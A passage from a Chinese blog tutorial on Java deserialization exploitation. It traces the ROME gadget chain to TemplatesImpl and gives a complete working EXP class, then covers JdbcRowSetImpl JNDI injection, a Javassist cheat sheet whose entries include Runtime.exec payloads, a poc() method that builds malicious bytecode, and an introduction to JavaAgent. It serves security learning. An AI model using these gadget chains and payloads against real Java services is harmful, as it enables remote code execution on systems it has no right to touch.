class="hljs-number">0</span>; ; ++binCount) &#123;<br>                    <span class="hljs-keyword">if</span> ((e = p.next) == <span class="hljs-literal">null</span>) &#123;<br>                        p.next = newNode(hash, key, value, <span class="hljs-literal">null</span>);<br>                        <span class="hljs-keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="hljs-number">1</span>) <span class="hljs-comment">// -1 for 1st</span><br>                            treeifyBin(tab, hash);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp;<br>                        ((k = e.key) == key || (key != <span class="hljs-literal">null</span> &amp;&amp; key.equals(k))))<br>                        <span class="hljs-keyword">break</span>;<br>                    p = e;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (e != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">// existing mapping for key</span><br>                <span class="hljs-type">V</span> <span class="hljs-variable">oldValue</span> <span class="hljs-operator">=</span> e.value;<br>                <span class="hljs-keyword">if</span> (!onlyIfAbsent || oldValue == <span class="hljs-literal">null</span>)<br>                    e.value = value;<br>                afterNodeAccess(e);<br>                <span class="hljs-keyword">return</span> oldValue;<br>            &#125;<br>        &#125;<br>        ++modCount;<br>        <span class="hljs-keyword">if</span> (++size &gt; threshold)<br>            resize();<br>        afterNodeInsertion(evict);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>HashMap的putVal方法</p>
<p>那么整个链子就是</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">HashMap<span class="hljs-selector-class">.readObject</span>()<br>↓<br>HashMap<span class="hljs-selector-class">.put</span>()<br>↓<br>HashMap<span class="hljs-selector-class">.putVal</span>()<br>↓<br>HotSwappableTargetSource<span class="hljs-selector-class">.equals</span>()<br>↓<br>XString<span class="hljs-selector-class">.equals</span>()<br>↓<br>ToStringBean<span class="hljs-selector-class">.toString</span>()<br>↓<br>TemplatesImpl<span class="hljs-selector-class">.getOutputProperties</span>()<br>↓<br>触发 <span class="hljs-built_in">defineTransletClasses</span>() → 加载恶意字节码 → RCE<br></code></pre></td></tr></table></figure>

<h5 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ROME</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(object, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(object);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaSec\\CC1\\target\\classes\\ROME\\shell.class&quot;</span>));<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;ROME&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecodes&#125;);<br>        setValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(toStringBean);<br>        <span class="hljs-type">HotSwappableTargetSource</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HotSwappableTargetSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xxx&quot;</span>));<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hash.put(h1, <span class="hljs-string">&quot;h1&quot;</span>);<br>        hash.put(h2, <span class="hljs-string">&quot;h2&quot;</span>);<br>        setValue(toStringBean, <span class="hljs-string">&quot;_obj&quot;</span>, templates);<br>        serialize(hash);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><p>前面的<code>ToStringBean</code>中导致恶意类加载的原因就是因为它的<code>toString</code>方法可以进行任意的类的<code>Getter</code>调用，从而触发<code>TemplatesImpl</code>的<code>getter</code>方法<code>getOutputProperties</code>任意类加载。而在<code>JdbcRowSetImpl</code>中<code>getter</code>方法<code>getDatabaseMetaData</code>会触发JNDI注入。</p>
<p>看代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> DatabaseMetaData <span class="hljs-title function_">getDatabaseMetaData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.connect();<br>        <span class="hljs-keyword">return</span> var1.getMetaData();<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>跟进<code>connect</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Connection <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.conn;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getDataSourceName() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InitialContext</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>                <span class="hljs-type">DataSource</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> (DataSource)var1.lookup(<span class="hljs-built_in">this</span>.getDataSourceName());<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getUsername() != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-built_in">this</span>.getUsername().equals(<span class="hljs-string">&quot;&quot;</span>) ? var2.getConnection(<span class="hljs-built_in">this</span>.getUsername(), <span class="hljs-built_in">this</span>.getPassword()) : var2.getConnection();<br>            &#125; <span class="hljs-keyword">catch</span> (NamingException var3) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLException</span>(<span class="hljs-built_in">this</span>.resBundle.handleGetObject(<span class="hljs-string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getUrl() != <span class="hljs-literal">null</span> ? DriverManager.getConnection(<span class="hljs-built_in">this</span>.getUrl(), <span class="hljs-built_in">this</span>.getUsername(), <span class="hljs-built_in">this</span>.getPassword()) : <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>在<code>connect</code>中就会触发<code>InitialContext</code>的<code>lookup</code>，而<code>dataSource</code>是可控的，因此就可以通过RMI或者LDAP协议加载远程恶意类。</p>
<p>当然这个方法有一定的限制，那就是<code>trustURLCodebase</code>，目前有效的版本只有：</p>
<ul>
<li>RMI：<code>JDK 6u132</code>、<code>JDK 7u122</code>、<code>JDK 8u113</code>之前</li>
<li>LDAP：<code>JDK 7u201</code>、<code>8u191</code>、<code>6u211</code>、<code>JDK 11.0.1</code>之前</li>
</ul>
<p>这个我暂时先搁置一下😅RMI、LDAP后面再说。</p>
<h2 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h2><h4 id="Javassist是什么"><a href="#Javassist是什么" class="headerlink" title="Javassist是什么"></a>Javassist是什么</h4><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个 .class 文件包含一个 Java 类或接口。Javassist  就是一个用来 处理 Java  字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生成一个新的类对象，通过完全手动的方式。</p>
<h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="Javassist-使用速查表"><a href="#Javassist-使用速查表" class="headerlink" title="Javassist 使用速查表"></a>Javassist 使用速查表</h4><table>
<thead>
<tr>
<th><strong>功能</strong></th>
<th align="center"><strong>方法&#x2F;类</strong></th>
<th align="center"><strong>示例代码</strong></th>
<th align="center"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>获取 ClassPool</strong></td>
<td align="center"><code>ClassPool.getDefault()</code></td>
<td align="center"><code>ClassPool pool = ClassPool.getDefault();</code></td>
<td align="center">获取默认的类池，用于加载和创建类。</td>
</tr>
<tr>
<td><strong>加载已有类</strong></td>
<td align="center"><code>pool.get(&quot;类全名&quot;)</code></td>
<td align="center"><code>CtClass ct = pool.get(&quot;java.lang.String&quot;);</code></td>
<td align="center">从类池中获取已有类的 CtClass 对象。</td>
</tr>
<tr>
<td><strong>创建新类</strong></td>
<td align="center"><code>pool.makeClass(&quot;类名&quot;)</code></td>
<td align="center"><code>CtClass ct = pool.makeClass(&quot;Evil&quot;);</code></td>
<td align="center">动态生成一个新类。</td>
</tr>
<tr>
<td><strong>设置父类</strong>（继承某个类）</td>
<td align="center"><code>ct.setSuperclass(superCt)</code></td>
<td align="center"><code>ct.setSuperclass(pool.get(&quot;java.util.ArrayList&quot;));</code></td>
<td align="center">让当前类继承某个父类。</td>
</tr>
<tr>
<td><strong>创建接口</strong></td>
<td align="center"><code>ct.setInterfaces(new CtClass[]&#123;iface&#125;)</code></td>
<td align="center"><code>ct.setInterfaces(new CtClass[]&#123;pool.get(&quot;java.io.Serializable&quot;)&#125;);</code></td>
<td align="center">为动态类添加接口。</td>
</tr>
<tr>
<td><strong>添加构造方法</strong></td>
<td align="center"><code>CtConstructor</code></td>
<td align="center"><code>CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, ct); cons.setBody(&quot;&#123;System.out.println(\&quot;Hi\&quot;);&#125;&quot;); ct.addConstructor(cons);</code></td>
<td align="center">创建一个构造函数并添加到类中。</td>
</tr>
<tr>
<td><strong>创建默认构造方法</strong></td>
<td align="center"><code>CtNewConstructor.defaultConstructor(ct)</code></td>
<td align="center"><code>ct.addConstructor(CtNewConstructor.defaultConstructor(ct));</code></td>
<td align="center">快速创建无参构造函数。</td>
</tr>
<tr>
<td><strong>添加方法</strong></td>
<td align="center"><code>CtMethod</code></td>
<td align="center"><code>CtMethod m = new CtMethod(CtClass.voidType, &quot;sayHello&quot;, new CtClass[]&#123;&#125;, ct); m.setBody(&quot;&#123;System.out.println(\&quot;Hello\&quot;);&#125;&quot;); ct.addMethod(m);</code></td>
<td align="center">创建并添加一个新方法。</td>
</tr>
<tr>
<td><strong>修改已有方法</strong></td>
<td align="center"><code>getDeclaredMethod(&quot;方法名&quot;)</code></td>
<td align="center"><code>CtMethod m = ct.getDeclaredMethod(&quot;toString&quot;); m.setBody(&quot;&#123;return \&quot;hacked\&quot;;&#125;&quot;);</code></td>
<td align="center">获取并修改类中的现有方法实现。</td>
</tr>
<tr>
<td><strong>添加字段</strong></td>
<td align="center"><code>CtField</code></td>
<td align="center"><code>CtField f = new CtField(CtClass.intType, &quot;age&quot;, ct); ct.addField(f, &quot;0&quot;);</code></td>
<td align="center">给类增加一个字段，并设置初始值。</td>
</tr>
<tr>
<td><strong>静态代码块（类初始化）</strong></td>
<td align="center"><code>makeClassInitializer()</code></td>
<td align="center"><code>CtConstructor cinit = ct.makeClassInitializer(); cinit.setBody(&quot;&#123; System.out.println(\&quot;Class Loaded!\&quot;); &#125;&quot;);</code></td>
<td align="center">动态添加 &#96;&#96; 静态块。</td>
</tr>
<tr>
<td><strong>生成字节码</strong></td>
<td align="center"><code>ct.toBytecode()</code></td>
<td align="center"><code>byte[] bytes = ct.toBytecode();</code></td>
<td align="center">将 CtClass 转换为字节数组，用于 TemplatesImpl 等场景。</td>
</tr>
<tr>
<td><strong>写入 .class 文件</strong></td>
<td align="center"><code>ct.writeFile(&quot;路径&quot;)</code></td>
<td align="center"><code>ct.writeFile(&quot;/tmp&quot;);</code></td>
<td align="center">将动态生成的类写到磁盘。</td>
</tr>
<tr>
<td><strong>加载类到 JVM</strong></td>
<td align="center"><code>ct.toClass()</code></td>
<td align="center"><code>Class clazz = ct.toClass();</code></td>
<td align="center">直接将动态类加载到 JVM 中并返回 Class 对象。</td>
</tr>
<tr>
<td><strong>冻结类</strong></td>
<td align="center"><code>ct.freeze()</code></td>
<td align="center"><code>ct.freeze();</code></td>
<td align="center">将 CtClass 冻结为不可修改状态。</td>
</tr>
<tr>
<td><strong>解冻类</strong></td>
<td align="center"><code>ct.defrost()</code></td>
<td align="center"><code>ct.defrost();</code></td>
<td align="center">解冻 CtClass，以便重新修改。</td>
</tr>
</tbody></table>
<h2 id="常见-setBody-写法表"><a href="#常见-setBody-写法表" class="headerlink" title="常见 setBody() 写法表"></a><strong>常见 <code>setBody()</code> 写法表</strong></h2><table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>写法</strong></th>
<th><strong>示例</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>打印语句</strong></td>
<td><code>&quot;&#123; System.out.println(\&quot;text\&quot;); &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; System.out.println(\&quot;Hello\&quot;); &#125;&quot;);</code></td>
<td>打印 Hello</td>
</tr>
<tr>
<td><strong>返回值</strong></td>
<td><code>&quot;&#123; return 123; &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; return 42; &#125;&quot;);</code></td>
<td>返回 int 值</td>
</tr>
<tr>
<td><strong>返回字符串</strong></td>
<td><code>&quot;&#123; return \&quot;abc\&quot;; &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; return \&quot;abc\&quot;; &#125;&quot;);</code></td>
<td>返回 String</td>
</tr>
<tr>
<td><strong>调用 Runtime 执行命令</strong></td>
<td><code>&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</code></td>
<td><code>constructor.setBody(&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;);</code></td>
<td>用于 RCE payload</td>
</tr>
<tr>
<td><strong>使用参数</strong></td>
<td><code>&quot;&#123; System.out.println($1); &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; System.out.println($1); &#125;&quot;);</code></td>
<td>打印第一个参数</td>
</tr>
<tr>
<td><strong>修改参数</strong></td>
<td><code>&quot;&#123; $1 = \&quot;newVal\&quot;; &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; $1 = \&quot;test\&quot;; System.out.println($1); &#125;&quot;);</code></td>
<td>改写第一个参数</td>
</tr>
<tr>
<td><strong>调用其他方法</strong></td>
<td><code>&quot;&#123; helper($1); &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; helper($1); &#125;&quot;);</code></td>
<td>调用类中其他方法</td>
</tr>
<tr>
<td><strong>组合参数</strong></td>
<td><code>&quot;&#123; System.out.println($1 + \&quot; \&quot; + $2); &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; System.out.println($1 + \&quot; \&quot; + $2); &#125;&quot;);</code></td>
<td>拼接输出</td>
</tr>
<tr>
<td><strong>返回 Object</strong></td>
<td><code>&quot;&#123; return new Integer(100); &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; return Integer.valueOf(100); &#125;&quot;);</code></td>
<td>返回包装类型</td>
</tr>
<tr>
<td><strong>多行代码</strong></td>
<td><code>&quot;&#123; int x=1; int y=2; return x+y; &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; int a=5; int b=10; return a+b; &#125;&quot;);</code></td>
<td>逻辑块</td>
</tr>
<tr>
<td><strong>使用 try-catch</strong></td>
<td><code>&quot;&#123; try &#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&quot;</code></td>
<td>-</td>
<td>支持异常处理</td>
</tr>
<tr>
<td><strong>返回 <code>$args</code></strong></td>
<td><code>&quot;&#123; return $args; &#125;&quot;</code></td>
<td><code>method.setBody(&quot;&#123; return $args; &#125;&quot;);</code></td>
<td>返回 Object[] 参数</td>
</tr>
</tbody></table>
<h2 id="Javassist-变量替换速查表"><a href="#Javassist-变量替换速查表" class="headerlink" title="Javassist $ 变量替换速查表"></a><strong>Javassist <code>$</code> 变量替换速查表</strong></h2><table>
<thead>
<tr>
<th>变量</th>
<th>含义</th>
<th>示例写法</th>
<th>示例代码解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>当前对象 <code>this</code></td>
<td><code>$0.name = &quot;Tom&quot;;</code></td>
<td>等价于 <code>this.name = &quot;Tom&quot;;</code></td>
</tr>
<tr>
<td><code>$1</code></td>
<td>第一个参数</td>
<td><code>$0.name = $1;</code></td>
<td>等价于 <code>this.name = 参数1;</code></td>
</tr>
<tr>
<td><code>$2</code></td>
<td>第二个参数</td>
<td><code>$0.age = $2;</code></td>
<td>等价于 <code>this.age = 参数2;</code></td>
</tr>
<tr>
<td><code>$$</code></td>
<td>所有参数列表</td>
<td><code>System.out.println($$);</code></td>
<td>等价于 <code>System.out.println(arg1, arg2, ...)</code></td>
</tr>
<tr>
<td><code>$args</code></td>
<td><code>Object[]</code> 类型的所有参数数组</td>
<td><code>Object[] arr = $args;</code></td>
<td>得到所有参数的数组</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>返回值（只能用于 <code>insertAfter</code> 或 <code>setBody</code>）</td>
<td><code>$_ = $_ + 1;</code></td>
<td>将返回值加 1</td>
</tr>
<tr>
<td><code>$cflow(X)</code></td>
<td><code>X</code> 标签的控制流计数器（高级用法）</td>
<td><code>if ($cflow(mylabel) &gt; 0) ...</code></td>
<td>判断某段代码块执行次数</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>表示强制类型转换为方法的返回类型</td>
<td><code>return ($r) $1;</code></td>
<td>将参数1强制转为返回类型</td>
</tr>
<tr>
<td><code>$w</code></td>
<td>将基本类型转换为包装类（wrapper）</td>
<td><code>Object o = ($w) $1;</code></td>
<td>将基本类型参数包装为 <code>Integer</code>, <code>Double</code> 等</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//拿ROME的链子来说，我们可以像下面这样来写恶意字节码</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] poc() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>        constructor.setBody(<span class="hljs-string">&quot;&#123;Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>        ctClass.defrost();<br>        <span class="hljs-keyword">return</span> bytes;<br>    &#125;<br></code></pre></td></tr></table></figure>

<h2 id="JavaAgent与POJONode"><a href="#JavaAgent与POJONode" class="headerlink" title="JavaAgent与POJONode"></a>JavaAgent与POJONode</h2><h3 id="JavaAgent是什么？"><a href="#JavaAgent是什么？" class="headerlink" title="JavaAgent是什么？"></a>JavaAgent是什么？</h3><p><code>javaagent</code> 是 Java 提供的一种机制，用于在 <strong>目标 JVM 启动时（premain）</strong> 或 <strong>运行中（agentmain）</strong> 对类进行动态修改（Instrumentation）。<br> 它常用于：</p>
<ul>
<li><strong>AOP (面向切面编程)</strong></li>
<li><strong>监控&#x2F;性能分析</strong>（如 Arthas、SkyWalking、BTrace）</li>
<li><strong>安全测试与字节码注入</strong></li>
<li><strong>热更新或方法拦截</strong></li>
</ul>
<p>Java Agent 依赖于 <strong>Instrumentation API</strong> 和 <strong>字节码操作框架（如 Javassist、ASM、ByteBuddy）</strong>。</p>
<p>在JDK1.5之前，JVM规范定义了JVMPI（<strong>Java Virtual Machine Profiler Interface</strong>）语义，JVMPI提供了一批JVM分析接口。在 <code>jdk 1.5</code> 之后引入了 <code>java.lang.instrument</code> 包，该包提供了检测 <code>java</code> 程序的 <code>Api</code>，比如用于监控、收集性能信息、诊断问题，通过 <code>java.lang.instrument</code> 实现的工具我们称之为 <code>Java Agent</code>。</p>
<p>当JVM在加载<code>.class</code>类文件的时候会触发<code>ClassFileLoadHook</code>回调<code>JNI</code>执行<code>sun.instrument.InstrumnetationImpl#trtansform</code>方法，如果我们自己实现了<code>ClassFileTransformer</code>的<code>transform</code>方法，则会用<code>transform</code>方法返回的字节码内容替换掉原来读取到的<code>.class</code>文件的字节码。</p>
<p>参数 javaagent 可以用于指定一个 jar 包，并且对该 java 包有2个要求：</p>
<ol>
<li>这个 jar 包的 MANIFEST.MF 文件必须指定 Premain-Class 项。</li>
<li>Premain-Class 指定的那个类必须实现 premain() 方法。</li>
</ol>
<p>premain类：当JVM启动时，在执行 main 函数之前，JVM 会先运行<code>-javaagent</code>所指定 jar 包内 Premain-Class 这个类的 premain 方法 。</p>
<p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202507212001946.png" srcset="/img/loading.gif" lazyload alt="image-20250721200100442"></p>
<p>使用 javaagent 需要几个步骤：</p>
<ol>
<li>定义一个 MANIFEST.MF 文件，必须包含 Premain-Class 选项，通常也会加入Can-Redefine-Classes 和 Can-Retransform-Classes 选项。</li>
<li>创建一个Premain-Class 指定的类，类中包含 premain 方法，方法逻辑由用户自己确定。</li>
<li>将 premain 的类和 MANIFEST.MF 文件打成 jar 包。</li>
<li>使用参数 -javaagent: jar包路径 启动要代理的方法。</li>
</ol>
